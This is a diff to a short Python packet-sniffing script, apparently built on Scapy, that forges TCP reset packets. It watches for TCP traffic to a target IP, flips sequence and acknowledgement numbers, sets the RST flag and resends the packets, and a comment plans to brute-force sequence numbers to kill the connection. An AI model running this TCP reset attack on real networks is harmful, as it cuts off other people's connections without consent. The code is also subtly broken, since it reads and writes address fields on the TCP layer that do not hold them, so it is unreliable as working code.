@@ -6,14 +6,19 @@ def pkt_callback(packet):
     if (TCP in packet):
         if (packet[IP].dst == target_ip):
             resetPkt = packet
-            seq = packet[TCP].seq
-            ack = packet[TCP].ack
-            resetPkt[TCP].seq = ack
-            resetPkt[TCP].ack = seq
+            #set reset packet
             resetPkt[TCP].flags = 'R'
-            packet[TCP].show()
-            resetPkt[TCP].show()
+            #set ack number
+            ack = resetPkt[TCP].ack
+            seq = resetPkt[TCP].seq
+            dst = resetPkt[TCP].dst
+            src = resetPkt[TCP].src
+            resetPkt[TCP].ack = seq
+            resetPkt[TCP].seq = ack
+            resetPkt[TCP].src = dst
+            resetPkt[TCP].dst = src
             sendp(resetPkt)
+            #now enumerate through possible sequence numbers to try and kill the connection
 
 
 interface = "ens10"
